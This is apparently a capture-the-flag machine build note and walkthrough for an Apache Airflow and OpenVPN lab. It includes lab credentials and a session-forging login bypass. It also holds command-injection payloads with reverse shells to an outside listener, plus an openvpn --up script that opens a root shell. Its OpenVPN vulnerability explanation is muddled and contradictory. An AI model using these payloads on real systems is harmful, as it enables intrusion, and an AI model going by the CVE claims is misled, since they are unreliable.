# Dagger

## Difficulty : Easy Machine

## Introduction

This is my First hackthebox machine build. <br>
I made this machine to escalate the vulnarability of the Apache Airflow and the open vpn. <br>
Two Apache Airflow vulnarability used in the same aplication little tricky to get up to the system and a software vulnarability to escalate the privillege. <br>
The main objective of my machine is the research and some tricky methodologies and combining the 2 different escalation methon for an single vulnarability. <br>
While the vulnarability is the sigle the method to exploit and escalate the privillege can be same same but different :) <br>
Also I can get more knowledge on vast privillege vulnarability, escalation methods, system configuration, config files, etc. Its really helping me. <br>

## Story-line

1. Airflow 1.10.10 – The Beating Heart of Logistics
Workflow Automation:

DAG 1: "RouteOptimizer" – Pulls real-time traffic and weather data, recalculates best delivery routes every 30 mins.

DAG 2: "InventorySync" – Syncs stock levels between warehouses nightly.

DAG 3: "FraudDetect"* – Runs ML models to flag suspicious shipments.

Why They Stuck with 1.10.10?

"We customized the executor and don’t want to risk migration."

"Our legacy Python 3.6 scripts won’t work on newer Airflow."

2. OpenVPN 2.5.10 – The Aging Gatekeeper
Usage:

Remote Work: Data scientists connect via OpenVPN to access Airflow’s UI (hosted at airflow.cloudsync.internal).

Warehouse Terminals: Forklift operators use VPN to update shipment statuses via a CLI tool.

Why Not Upgrade?

"It’s just VPN, what could go wrong?"

"Our IT guy left, and nobody knows how to migrate."

## Start the server the server

path :

cd /home/userdag/

Activate the venv
```
source airflow-env/bin/activate
```
Start the Server
```
airflow webserver -p 8080
```
Dag Will only execute while the scheduler is running 
```
airflow scheduler
```
use ignito tab or clear cache if needed. 

## Troubleshooting the server

Gunicor creashes while stoping by **ctrl+z** and restarting the server with **airflow webserver -p 8080** with a certain **PID** <br>
In Case of any Gunicorn creashes with an pid
```
sudo kill -9 23118
```
```
sudo pkill -9 -f "airflow-webserver|gunicorn"
```
Kill all the **PID** listed, if one left leave it its ok
```
ps aux | grep -E "airflow|gunicorn"
```

## Info for HTB

### Access

Passwords:

| User    | Password                |
| --------| ----------------------- |
| userdag | userdag!@@774455        |
| root    | rootdag!##885566        |

Psql Credentials :
| User  | Password       |
| ----- | -------------- |
| banedic | john_banedic |

Airflow Credentials:
| User       | Password      |
| ---------- | --------------|
| james_scar | james$lost456 |

### Key Processes :

Python 3.7.17<br>
Psql(PostgreSQL) 9.6.24

### Vulanarable Process :

Apache airflow 1.10.10 (Application Vulnarability) - http servicerunning in port 8080<br>
Airflow scheduler (Run along with the Apache Airflow Server, to Execute the dag)<br>
Openvpn 2.5.10 (For Privillege Escalation)<br>

### Automation / Crons

[No Automation, Fully manual Configuration]

### Firewall Rules/User Permission
```
Matching Defaults entries for userdag on dagger:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User userdag may run the following commands on dagger:
    (ALL) /usr/local/sbin/openvpn /opt/example.ovpn
    (ALL) NOPASSWD: /usr/bin/sudo -l
    (ALL : ALL) ALL
```
# Writeup

# Scanning

```
nmap -A 192.168.1.16
```

```
shuhaib@ubuntu:~$ nmap -A 192.168.1.16
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-29 05:25 UTC
Nmap scan report for 192.168.1.16
Host is up (0.00080s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Gunicorn 19.10.0
|_http-server-header: gunicorn/19.10.0
| http-title: Airflow - Login
|_Requested resource was http://192.168.1.16:8080/admin/airflow/login?next=%2Fadmin%2F
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```
From the scanning we can understant that Gunicorn 19.10.0 is running on the port 8080, Gunicorn will mostly running any web service

We can just try it on the browser
```
http://IP Address:8080/
```
```
http://dagger.htb:8080/
```
Will appear the login page of the Apache Airflow

![Screenshot 2025-03-29 104117](https://github.com/user-attachments/assets/1e60411f-0415-451a-a3fc-92ec85902fb9)


# Enumeration

After getting the login page just check the source code, from where we get the version of the Airflow login page. 

href="https://airflow.apache.org/docs/1.10.10"

![Screenshot 2025-03-29 104533](https://github.com/user-attachments/assets/e8c7e6ed-7d5c-4e7c-aac2-1170efc1319a)

Now we can go for some research to find anu vulnarability is available for that perticular version 1.10.10 of Aiflow login page.

After some time of research we can find that the version is vulnarable to, Authentication Bypass (CVE-2020-17526)

https://security.snyk.io/vuln/SNYK-PYTHON-APACHEAIRFLOW-1053432

https://kloudle.com/academy/authentication-bypass-in-apache-airflow-cve-2020-17526-and-aws-cloud-platform-compromise/

https://vulners.com/nuclei/NUCLEI:CVE-2020-17526

# Application Vulanarability - Login Bypass

```
curl -v http://dagger.htb:8080/admin/airflow/login?next=%2Fadmin%2F
```
```
D:\>curl -v http://dagger.htb:8080/admin/airflow/login?next=%2Fadmin%2F<br>
* Host dagger.htb:8080 was resolved.
* IPv6: (none)
* IPv4: 192.168.1.16<br>
*   Trying 192.168.1.16:8080...
* Connected to dagger.htb (192.168.1.16) port 8080
* using HTTP/1.x
> GET /admin/airflow/login?next=%2Fadmin%2F HTTP/1.1
> Host: dagger.htb:8080
> User-Agent: curl/8.10.1
> Accept: */*

* Request completely sent off
< HTTP/1.1 200 OK
< Server: gunicorn/19.10.0
< Date: Sat, 29 Mar 2025 04:24:40 GMT
< Connection: close
< Content-Type: text/html; charset=utf-8
< Content-Length: 8103
< Vary: Cookie
< Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiMzUzMDBlMWMwYTAyNTVmYmQwNWNhMTE3ZWYzNWM3YTlkNjVmMzVkYSJ9.Z-d2CA.Z3VdZ9dxsuJXKSVtgpbl5BCwLQc; HttpOnly; Path=/
```
Here we get the

Set-Cookie: session=eyJjc3JmX3Rva2VuIjoiMzUzMDBlMWMwYTAyNTVmYmQwNWNhMTE3ZWYzNWM3YTlkNjVmMzVkYSJ9.Z-d2CA.Z3VdZ9dxsuJXKSVtgpbl5BCwLQc;

Then, use flask-unsign to crack the session key

```
pip install flask-unsign
```

```
flask-unsign -u -c [session from Cookie]
```
```
(my-env) shuhaib@ubuntu:~$ flask-unsign -u -c eyJjc3JmX3Rva2VuIjoiYmUzZjI4NGFhMjFmMGFhYmY5OTVjOWQ4ZWYyNTMyMTk0ZTQ4YjUyZCJ9.Z-OWZg.bbuK_FlaXIPB1NFOQjne-gPN72E
[*] Session decodes to: {'csrf_token': 'be3f284aa21f0aabf995c9d8ef2532194e48b52d'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2048): -----BEGIN PRIVATE KEY-----CR
[*] Attempted (38272): w.;>{1ab2022rap***********U9YI
[+] Found secret key after 53248 attemptscxbi2r^f8&am
'temporary_key'
```
```
flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
```
```
(my-env) shuhaib@ubuntu:~$ flask-unsign -s --secret temporary_key -c "{'user_id': '1', '_fresh': False, '_permanent': True}"
eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlLCJ1c2VyX2lkIjoiMSJ9.Z-OdMg.MVwvmUf140O_luKNoi7k4prKMMY
```
Now we can use the new session in the login page.<br>
There is small tricky part is use this url for the bypass <br>
```
http://dagger.htb:8080/admin/ariflow/login
```
And also we can attain once we try to bypass the login page with the new session and a fake username and password, it wil redirect to a bad request page with the url 
```
http://dagger.htb:8080/admin/ariflow/login
```

We are doing this way becouse the **login page** will ask for the credential, while the **Bad Request** will not ask for the credentials.

![Screenshot 2025-03-29 084821](https://github.com/user-attachments/assets/26311ccb-94fc-4f65-88c8-56ee83de1ccb)

From where we again try to bypass with the already created new session key in that page without credential we can log in to the admin panel.

![Screenshot 2025-03-29 085141](https://github.com/user-attachments/assets/7fb1f1ac-7dc3-46fe-950d-6d5ad20bd636)

Save the session and go for the url

```
http://dagger.htb:8080/admin/ariflow/login
```

![Screenshot 2025-03-29 085824](https://github.com/user-attachments/assets/8347b854-335e-42d0-9111-2733eb081b71)

Reference link :

http://www.rapid7.com/db/modules/exploit/linux/http/apache_airflow_dag_rce/

CVE-2020-11978 

CVE-2020-13927

# Exploitation - Getting Shell

Where We can see the DAGS **example_triger_target_dag**

![Screenshot 2025-03-29 085832](https://github.com/user-attachments/assets/d075ee20-8913-42bd-bf39-6a180fda33aa)

For Doing that **turn on** the dag and click the **trigger dag**

![Screenshot 2025-03-29 090111](https://github.com/user-attachments/assets/6c1f2658-913c-4dd7-aec7-4faccc9ba418)

And we will get a page to trigger the dag, then input the configuration JSON with the crafted payload

```
{"message":"'\";bash -i >& /dev/tcp/192.168.1.2/4444 0>&1;#"}
```
We can also use to trigger the dag, which will create corresponding the file in the /tmp diectory.

```
{"message":"'\";touch /tmp/airflow_dag_success;#"}
```
```
{"message":"'\";touch /tmp/demo.txt;#"}
```
![Screenshot 2025-03-29 090144](https://github.com/user-attachments/assets/e99b65a2-bb9f-46d2-a13d-a0d0680ab528)

Then just check the execution of the dag on the dashborad, once it is success we will get our shell

![Screenshot 2025-03-29 090245](https://github.com/user-attachments/assets/9c9af260-24d8-4b69-86f6-f3be37340fac)

![Screenshot 2025-03-29 090259](https://github.com/user-attachments/assets/9896ef04-0b7d-4a4b-97ae-f0b186b34c12)


```
D:\>nc -nlvp 4444
listening on [any] 4444 ...

userdag@dagger:~$ ls
airflow  airflow-env  user.txt
userdag@dagger:~$ cat user.txt
73f81dd1e66e640a2ba99e3215c7e271
```

# Foothold

[Describe the steps for obtaining an initial foothold (shell/command execution) on the target.]



# Privilege Escalation
```
userdag@dagger:~$ sudo -l
Matching Defaults entries for userdag on dagger:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User userdag may run the following commands on dagger:
    (ALL) /usr/local/sbin/openvpn /opt/example.ovpn
    (ALL) NOPASSWD: /usr/bin/sudo -l
    (ALL : ALL) ALL
```
While permission is given to the user for using the openvpn, we can suspiciously go for a check in openvpn

```
userdag@dagger:~$ openvpn --version
OpenVPN 2.5.10 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on Mar 28 2025
library versions: OpenSSL 1.1.1f  31 Mar 2020, LZO 2.10
Originally developed by James Yonan
Copyright (C) 2002-2022 OpenVPN Inc <sales@openvpn.net>
```

This version of the openvpn is critically vulnarable to **Privilege Escalation**

Reference link :

https://security.snyk.io/vuln/SNYK-ALPINE317-OPENVPN-7414706

https://www.rapid7.com/db/vulnerabilities/ubuntu-cve-2024-5594/

```
OpenVPN versions prior to 2.5.10 and 2.6.10, including 2.5.10, are vulnerable to multiple security issues that could lead to remote code execution (RCE) and local privilege escalation (LPE), as detailed in Microsoft's security blog. 
Here's a breakdown of the vulnerabilities and recommended actions:
Vulnerabilities:
CVE-2024-27459:
Vulnerability in the communication mechanism between the openvpn.exe process and the openvpnserv.exe service, potentially leading to privilege escalation. 
CVE-2024-24974:
Unprivileged access to an operating system resource, allowing remote access to the service pipe for the interactive service component of OpenVPN GUI for Windows. 
CVE-2024-27903:
Loading of plugins from untrusted paths, which could be used to attack openvpn.exe via a malicious plugin. 
CVE-2024-1305:
Potential integer overflow in the Windows TAP driver. 
Affected Products:
All versions of OpenVPN prior to 2.6.10 (and 2.5.10). 
Recommendations:
Update Immediately:
Upgrade to the latest OpenVPN versions (2.6.10 or 2.5.10) to address these vulnerabilities.
Disallow Remote Access:
CVE-2024-24974 disallows remote access to the service pipe for the interactive service component of OpenVPN GUI for Windows, solving the remote access vulnerability.
Security Advisories:
Refer to the OpenVPN security advisories page for detailed information and updates.
Additional Security Measures:
Ensure all devices in your network are updated with the latest patches from the OpenVPN website.
Disconnect OpenVPN clients from the internet and keep them on a separate network segment.
Restrict access to OpenVPN clients to authorized users only. 
```
Reference link For Exploitation :

https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-openvpn-privilege-escalation/

https://gtfobins.github.io/gtfobins/openvpn/

while both the resourses are exploiting the same vulnarability, but the vulnarability is not working in that perticular way so that we combine the both styl of exploitation and try to apply.

But If anybody can trigger the method of using the /opt/example.ovpn they can use it in that way. It is up to them 

```
echo '#!/bin/bash' > /tmp/rev_shell.sh
echo 'sudo bash -i >& /dev/tcp/192.168.1.2/4444 0>&1' >> /tmp/rev_shell.sh
chmod +x /tmp/rev_shell.sh
```
```
openvpn --dev null --script-security 2 --up "/tmp/rev_shell.sh"
```
```
nc -lvnp 4545
```
```
userdag@dagger:~$ echo '#!/bin/bash' > /tmp/rev_shell.sh
userdag@dagger:~$ echo 'sudo bash -i >& /dev/tcp/192.168.1.2/4545 0>&1' >> /tmp/rev_shell.sh
userdag@dagger:~$ chmod +x /tmp/rev_shell.sh
userdag@dagger:~$ openvpn --dev null --script-security 2 --up "/tmp/rev_shell.sh"
2025-03-29 03:47:11 Cipher negotiation is disabled since neither P2MP client nor server mode is enabled
2025-03-29 03:47:11 OpenVPN 2.5.10 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on Mar 28 2025
2025-03-29 03:47:11 library versions: OpenSSL 1.1.1f  31 Mar 2020, LZO 2.10
2025-03-29 03:47:11 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts
2025-03-29 03:47:11 ******* WARNING *******: All encryption and authentication features disabled -- All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
2025-03-29 03:47:11 /tmp/rev_shell.sh null 1500 1500   init
```
```
D:\>nc -lvnp 4545
listening on [any] 4545 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.16] 59554

root@dagger:~# whoami
whoami
root
root@dagger:~# cat root.txt
208723761293820d15631e961ab015f6
```
